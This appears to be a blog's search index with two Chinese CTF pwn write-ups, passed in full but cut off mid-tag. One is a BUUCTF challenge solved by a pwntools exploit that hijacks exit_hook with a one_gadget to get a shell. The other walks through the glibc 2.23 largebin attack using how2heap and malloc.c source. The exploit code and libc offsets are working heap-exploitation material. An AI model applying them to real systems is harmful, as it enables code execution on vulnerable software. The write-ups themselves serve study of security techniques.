<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>buuctf刷题记录</title>
      <link href="/2022/01/17/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2022/01/17/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<p> 一切随缘啦~</p><h2 id="ciscn-2019-n-7"><a href="#ciscn-2019-n-7" class="headerlink" title="ciscn_2019_n_7"></a>ciscn_2019_n_7</h2><p>程序每次只能申请一个 chunk，有 edit ，没有 free </p><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>chunk_array+2 处存有 content ，0x10 字节写入会覆盖掉 content</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  v1 = chunk_array;</span><br><span class="line">  *chunk_array = length;</span><br><span class="line">  v1[<span class="number">2</span>] = <span class="built_in">malloc</span>(length);</span><br><span class="line">  unk_202014 = <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Author name:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, chunk_array + <span class="number">1</span>, <span class="number">0x10</span>uLL);<span class="comment">//</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Now,you can edit your article.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在菜单中输入 666 能泄露 libc</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">666</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_C50();</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">----------------------------------------</span><br><span class="line">    <span class="function">__int64 <span class="title">sub_C50</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> _printf_chk(<span class="number">1LL</span>, &amp;unk_10D4, &amp;<span class="built_in">puts</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>劫持 exit_hook ，写入 og 即可</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./main&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="string">&#x27;26203&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;2.23/libc.so.6&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">leng,con</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="built_in">str</span>(leng))</span><br><span class="line">p.sendafter(<span class="string">&#x27;:&#x27;</span>,con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">n,c</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,n)</span><br><span class="line">p.sendafter(<span class="string">&#x27;:&#x27;</span>,c)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span>():</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;666&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line"><span class="comment">#libcbase = int(p.recv(12),16) - (0x7f783029b5d0-0x7f783022c000) - 0xc0</span></span><br><span class="line">libcbase = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">print(<span class="string">&quot;leak:&quot;</span>+<span class="built_in">hex</span>(libcbase))</span><br><span class="line">exit_hook = libcbase + <span class="number">0x5f0040</span> + <span class="number">3848</span></span><br><span class="line">print(<span class="string">&quot;exit_hook:&quot;</span>+<span class="built_in">hex</span>(exit_hook))</span><br><span class="line">one = libcbase + <span class="number">0xf1147</span>  <span class="comment">#0x4525a 0xef9f4 0xf0897 0x45206 | 0x45216 0x4526a 0xf02a4 0xf1147</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span>+p64(exit_hook))</span><br><span class="line">edit(<span class="string">&#x27;name&#x27;</span>,p64(one))</span><br><span class="line">print(<span class="string">&quot;one:&quot;</span>+<span class="built_in">hex</span>(one))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">exit()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">chunk_array 0x000000000202018</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="exit-hook的地址"><a href="#exit-hook的地址" class="headerlink" title="exit_hook的地址"></a>exit_hook的地址</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#在libc-2.23中</span><br><span class="line">exit_hook = libc_base+<span class="number">0x5f0040</span>+<span class="number">3848</span></span><br><span class="line"></span><br><span class="line">exit_hook = libc_base+<span class="number">0x5f0040</span>+<span class="number">3856</span></span><br><span class="line"></span><br><span class="line">#在libc-2.27中</span><br><span class="line">exit_hook = libc_base+<span class="number">0x619060</span>+<span class="number">3840</span></span><br><span class="line"></span><br><span class="line">exit_hook = libc_base+<span class="number">0x619060</span>+<span class="number">3848</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>堆利用之largebin_attack</title>
      <link href="/2021/12/12/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B9%8Blargebin-attack/"/>
      <url>/2021/12/12/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B9%8Blargebin-attack/</url>
      
        <content type="html"><![CDATA[<p> 和 unsorted bin attack 有点类似，都是通过把 fake_chunk 挂进 bin 中来引发问题，与 unsorted bin attack 不同的就是 large bin 要多考虑两个结构<code>fd_nextsize</code>和<code>bk_nextsize</code></p><p><strong>glibc：2.23</strong></p><h2 id="large-bin-结构"><a href="#large-bin-结构" class="headerlink" title="large bin 结构"></a>large bin 结构</h2><p>大于512（1024）字节的 chunk 称之为 large chunk，large bin 就是用于管理这些 large chunk 的</p><ul><li>从大到小排序</li><li>如果大小相同，按照free的时间排序</li><li>多个大小相同的堆块，只有首堆块的fd_nextsize和bk_nextsize会指向其他堆块，后面的堆块的fd_nextsize和bk_nextsize均为0</li><li>size最大的chunk的bk_nextsize指向最小的chunk，size最小的chunk的fd_nextsize指向最大的chunk</li></ul><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/largebin_attack/1639310788834389/05e879c1f22990e99abbdf85b9eafc648a1a8177.png" alt="image-20211212200628434"></p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/unlink/1638945814748879/4794b21608a2086ab4a7b2cd01c8985f0140d223.png" alt="image-20211208144334575"></p><h2 id="how2heap"><a href="#how2heap" class="headerlink" title="how2heap"></a>how2heap</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var1 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var1 (%p): %ld\n&quot;</span>, &amp;stack_var1, stack_var1);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var2 (%p): %ld\n\n&quot;</span>, &amp;stack_var2, stack_var2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x320</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span>* p4 = <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(p3);</span><br><span class="line"></span><br><span class="line">    p2[<span class="number">-1</span>] = <span class="number">0x3f1</span>;</span><br><span class="line">    p2[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    p2[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">    p2[<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var1 - <span class="number">2</span>);</span><br><span class="line">    p2[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var2 - <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var1 (%p): %p\n&quot;</span>, &amp;stack_var1, (<span class="keyword">void</span> *)stack_var1);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var2 (%p): %p\n&quot;</span>, &amp;stack_var2, (<span class="keyword">void</span> *)stack_var2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>19 行，首先定义了两个变量 stack_var1 和 stack_var2，然后再分别申请了 3 个 chunk ，p1(0x320)、p2(0x400)、p3(0x400)，中间用 0x20 大小的 chunk 隔开</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/largebin_attack/1639382177222005/d31527cb373bbf387c4fb3ce5c3780f84b7afff0.png" alt="image-20211213155616943"></p><p>22 行，free 掉 chunk_p1 和 chunk_p2，因为大小超出了 fastbin 的范围，所以链入 unsorted bin</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/largebin_attack/1639383361337294/85edf70f0102fc0d8501d55a440da63d7c838545.png" alt="image-20211213161601180"></p><p>24 行，申请一个 0x90 大小的 chunk </p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/largebin_attack/1639383820252624/9d572eff0a6a53d362c1861a31937797741e1d2c.png" alt="image-20211213162340098"></p><p>这一步做了很多事</p><ul><li>从 unsorted bin 中拿出 p1(0x602000) （因为 unsortedbin 遵循先进先出）</li><li>把 p1 放入 small bin，标记 small bin 中有空闲 chunk </li><li>从 unsorted bin 中拿出最后一个 chunk_p2</li><li> 将 p2 放入 large bin(大于0x3f0)，标记 large bin 中有空闲 chunk </li><li> unsorted bin 为空，从 small bin 中的 p1 分割出一个 chunk，把分割剩下的 chunk 丢入 unsorted bin</li></ul><p>26 行，释放 chunk_p3，同理也会进入 unsorted bin</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/largebin_attack/1639385500953829/2fb4ed544000717197563f441cd993740b57bbeb.png" alt="image-20211213165140789"></p><p>32 行，修改 chunk_p2 内部结构</p><p>修改前：</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/largebin_attack/1639386565637496/d8a83be901875cfc66e2158ee6fb6d807a55f996.png" alt="image-20211213170925481"></p><p>修改后：</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/largebin_attack/1639386437876625/72a8654447b08985105ab2f38f20fb7ea5e23700.png" alt="image-20211213170717719"></p><p>bk 改为了 <code>stack_var1 - 0x10</code>，所以以 <code>stack_var1 - 0x10</code>为 chunk 头的 fd 指针就是<code>stack_var1</code></p><p>同理， <code>bk_nextsize</code>被修改成了 <code>stack_var2 - 0x20 </code>，所以以<code>stack_var2 - 0x20 </code>为 chunk 头的 <code>fd_nextsize</code>就是<code>stack_var2</code> </p><p>用图片表示即为</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/largebin_attack/1639461615306750/74a8bd95b113349443df3cddc2409d099bea745e.png" alt="20210120161024708"></p><p>34 行，申请一个 0x90 大小的 chunk ，和之前一样</p><p>申请前：</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/largebin_attack/1639464055148389/0969ad83f00fcc96371544c4507a7d4f374f9810.png" alt="image-20211214144054971"></p><p>申请后：</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/largebin_attack/1639573853524011/d3b343245a4fc617196492a6921f16ecbc91645c.png" alt="image-20211215211053336"></p><ul><li>从 unsorted bin 中拿出 p1_left (0x6020a0)，放入 small bin，并标记 small bin 中有空闲 chunk </li><li>再从 unsorted bin 中拿出 p3 (0x6027a0)，放入 large bin，并标记 large bin 中有空闲 chunk</li><li>从 small bin 中分割出一个 0x90 大小的 chunk，剩下的 chunk 丢入 unsorted bin</li></ul><p>37 行，可以发现 stack_var1 和 stack_var2 被改为了同样的地址</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/largebin_attack/1639573179105499/04f877ea97915a4cc4aa1a345d6919b8a4cb7cac.png" alt="image-20211215205938894"></p><h2 id="malloc-c-源码分析"><a href="#malloc-c-源码分析" class="headerlink" title="malloc.c 源码分析"></a>malloc.c 源码分析</h2><p>现在细说 unsorted bin 拿出 p3 的过程，首先会判断 p3 应该归属的 bin 的类型，根据 size 判断出是 large bin，因为此时 large bin 中有 p2，所以还会比较 p3 和 p2 的大小，再根据实际情况制定两个 chunk 的 <code>fd_nextsize</code>、<code>bk_nextsize</code>、<code>fd</code>、<code>bk</code>指针，以下是具体过程：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//glibc-2.23 </span></span><br><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line"> unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line"> bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line"></span><br><span class="line"> <span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (size == nb)</span><br><span class="line">   &#123;</span><br><span class="line">     set_inuse_bit_at_offset (victim, size);</span><br><span class="line">     <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">       victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">     check_malloced_chunk (av, victim, nb);</span><br><span class="line">     <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">     alloc_perturb (p, bytes);</span><br><span class="line">     <span class="keyword">return</span> p;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/* place chunk in bin */</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (in_smallbin_range (size))</span><br><span class="line">   &#123;</span><br><span class="line">     victim_index = smallbin_index (size);</span><br><span class="line">     bck = bin_at (av, victim_index);</span><br><span class="line">     fwd = bck-&gt;fd;</span><br><span class="line">   &#125;</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">     victim_index = largebin_index (size);</span><br><span class="line">     bck = bin_at (av, victim_index);</span><br><span class="line">     fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">     <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">     <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">       &#123;</span><br><span class="line">         <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">         size |= PREV_INUSE;</span><br><span class="line">         <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">         assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">         <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (bck-&gt;bk-&gt;size))</span><br><span class="line">           &#123;</span><br><span class="line">             fwd = bck;</span><br><span class="line">             bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">             victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">             victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">             fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">           &#125;</span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">           &#123;</span><br><span class="line">             assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">             <span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size &lt; fwd-&gt;size)</span><br><span class="line">               &#123;</span><br><span class="line">                 fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">                 assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">               &#125;</span><br><span class="line"></span><br><span class="line">             <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size == (<span class="keyword">unsigned</span> <span class="keyword">long</span>) fwd-&gt;size)</span><br><span class="line">               <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">               fwd = fwd-&gt;fd;</span><br><span class="line">             <span class="keyword">else</span></span><br><span class="line">               &#123;</span><br><span class="line">                 victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                 victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                 fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                 victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">               &#125;</span><br><span class="line">             bck = fwd-&gt;bk;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">       victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"> mark_bin (av, victim_index);</span><br><span class="line"> victim-&gt;bk = bck;</span><br><span class="line"> victim-&gt;fd = fwd;</span><br><span class="line"> fwd-&gt;bk = victim;</span><br><span class="line"> bck-&gt;fd = victim;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>之后会比较 <code>要放入的chunk (p3)</code>和 <code>原来的chunk (p2)</code> 之间的大小</p><h3 id="p3-size-lt-p2-size"><a href="#p3-size-lt-p2-size" class="headerlink" title="p3_size &lt; p2_size"></a>p3_size &lt; p2_size</h3><p>如果 p3_size &lt; p2_size</p><p>就会执行下面的代码，<strong>因为之前我们把 p2 的 size 改为了0x3f0</strong>，p3 的 size 为 0x410，p3_size &gt; p2_size，所以会绕过这个循环</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size &lt; fwd-&gt;size)<span class="comment">//如果 p3 的 size 比 p2 的 size 小 </span></span><br><span class="line">  &#123;</span><br><span class="line">    fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">    assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h3 id="p3-size-p2-size"><a href="#p3-size-p2-size" class="headerlink" title="p3_size == p2_size"></a>p3_size == p2_size</h3><p>接着会判断 p3_size == p2_size 的情况</p><p>很显然也绕过了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size == (<span class="keyword">unsigned</span> <span class="keyword">long</span>) fwd-&gt;size)</span><br><span class="line">  <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">  fwd = fwd-&gt;fd;</span><br></pre></td></tr></table></figure><h3 id="p3-size-gt-p2-size"><a href="#p3-size-gt-p2-size" class="headerlink" title="p3_size &gt; p2_size"></a>p3_size &gt; p2_size</h3><p>然后就是 p3_size &gt; p2_size 的情况了</p><p>结合之前修改 p2 的内容可以得出</p><ul><li>p2-&gt;bk-&gt;fd = stack_var1</li><li>p2-&gt;bk_nextsize-&gt;fd_nextsize = stack_var2</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span><span class="comment">//制定 fd_nextsize 和 bk_nextsize</span></span><br><span class="line">  &#123;</span><br><span class="line">    victim-&gt;fd_nextsize = fwd;         <span class="comment">//victim 为 p3;fwd 为 p2</span></span><br><span class="line">    victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">    fwd-&gt;bk_nextsize = victim;</span><br><span class="line">    victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">  &#125;</span><br><span class="line">bck = fwd-&gt;bk;</span><br></pre></td></tr></table></figure><p>把上面的代码转化一下就是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">P3-&gt;fd_nextsize = P2;  <span class="comment">//P3的fd_nextsize要修改成P2的头指针</span></span><br><span class="line">P3-&gt;bk_nextsize = P2-&gt;bk_nextsize; <span class="comment">//P3的bk_nextsize要修改成P2的bk_nextsize指向的地址</span></span><br><span class="line">P2-&gt;bk_nextsize = P3;  <span class="comment">//P2的bk_nextsize要修改成P3的头指针</span></span><br><span class="line">P3-&gt;bk_nextsize-&gt;fd_nextsize = P3; <span class="comment">//P3的bk_nextsize所指向的堆块的fd_nextsize要修改成P3的头指针</span></span><br><span class="line">   &#125;</span><br><span class="line">   bck = P2-&gt;bk; <span class="comment">//bck等于P2的bk</span></span><br></pre></td></tr></table></figure><p>再转换</p><ul><li>p2-&gt;bk_nextsize-&gt;fd_nextsize = stack_var2</li><li>p3-&gt;bk_nextsize = p2-&gt;bk_nextsize</li><li>p3-&gt;bk_nextsize-&gt;fd_nextsize = p3</li></ul><p>解方程得 <code>stack_var2 = P3</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mark_bin (av, victim_index);<span class="comment">//制定 fd 和 bk</span></span><br><span class="line">victim-&gt;bk = bck; </span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure><p>同理得</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mark_bin(av, victim_index);</span><br><span class="line">P3-&gt;bk = p2-&gt;bk; <span class="comment">//P3的bk指针要等于P2的bk指针</span></span><br><span class="line">P3-&gt;fd = P2; <span class="comment">//P3的fd指针要等于P2的头指针</span></span><br><span class="line">P2-&gt;bk = P3; <span 